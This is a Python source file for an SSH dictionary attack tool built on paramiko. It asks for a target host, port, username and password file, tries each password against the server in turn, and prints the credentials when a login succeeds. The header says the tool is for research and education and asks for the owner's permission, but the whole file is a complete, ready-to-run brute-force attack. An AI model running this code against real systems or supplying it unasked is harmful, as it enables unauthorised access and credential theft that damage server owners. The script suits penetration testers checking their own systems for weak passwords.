#!/usr/bin/env python3

# SSH Dictionary Attacker
# Python 3.5.1
# Dependencies: (1) paramiko (www.paramiko.org/installing.html)
# 
# This is a noisy script for attacking insecure SSH servers. The script
# does not presume usernames. A password file (one password per line) must be provided.
#
# > Written by: forScience james@4a57.xyz
#
# ** This script has been created for research and educational purposes.
# ** It must only be used in accordance with the law. 
# ** Any and all use of this script (or derivatives of) must only be used on systems 
# ** with the express permission of the owner/admin.
# ** No warranty is expressed or implied.

import paramiko, sys, os

global target, port, user, password_list


def sshConnect(password):
	""" 
	Create ssh client session to test username and password

	Args:
		password -- contains string from each line of password file
	"""
	# Create client and auto-add key to prevent printing of host key policy warning
	ssh = paramiko.client.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# Attempt connection with user supplied creds (called iteratively)
	try: 
		ssh.connect(target, port=int(float(port)), username=user, password=password)

	# Catch bad creds
	except paramiko.AuthenticationException:
		ssh.close()
		print('Unsuccessful') # Print to attempt notification line

	# Catch target connection failure (generic exception) and clean up
	except OSError:
		f.close()
		ssh.close()
		sys.exit('\n[+] Connection to ' + target + ' was unsuccessful (the host is possibly down)\n[+] Exiting...\n')

	# Handle user ctrl+c within function
	except KeyboardInterrupt:
		sys.exit('\n[+] Exiting...\n')

	# Must have found the password!
	else:
		print('Bingo!')
		print('\n[!] SUCCESS! Creds: ' + user + '@' + target + ':' + str(port) + ' Password: ' + password + '\n')
		f.close()
		ssh.close()
		sys.exit(0)


# Intro message and usage warning
print('\n[+] SSH Dictionary Attacker')
print('[!] No permission is given for the unlawful use of this script\n')

# Get target credentials and password file from user
try:
	target        = input('>> Input target host address (IP or hostname): ')
	port          = input('>> Input target port (leave blank for default): ')
	user          = input('>> Input SSH username: ')
	password_list = input('>> Input path to password list (one password per line): ')

	# Check for empty strings, error exit if empty
	if target == '' or user == '' or password_list == '':
		sys.exit('\n[!] One or more required inputs ommited\n[+] Exiting...\n')

	# Check validity of password file path, error exit if not valid
	elif os.path.exists(password_list) == False:
		sys.exit('\n[!] File ' + password_list + ' does not exist\n[+] Exiting...\n')

	# Default port to 22 if empty string provided
	elif port == '':
		port = 22

# exit on ctrl+c gracefully in body of script
except KeyboardInterrupt:
	sys.exit('\n[+] Exiting...\n')


# Open and read password file
try:
	f = open(password_list, 'r')

# Catch generic file read errors
except OSError:
	sys.exit('\n[!] ' + password_list + ' is not an acceptable file path\n[+] Exiting...\n')

# Attempt count
count = 0 

# Iterate through password file
for line in f.readlines():
	password = line.strip('\n')
	count += 1
	print('[-] Attempt ' + str(count) + ': ' + password + ' ...', end=' ')
	sshConnect(password)


# If unsuccessful, tidy up, print tip and unlucky message
f.close()
print('\n[+] Unsuccessful, Password list exhausted\n[!] Check username and/or use a larger password list\n')
sys.exit('[+] Exiting...\n')
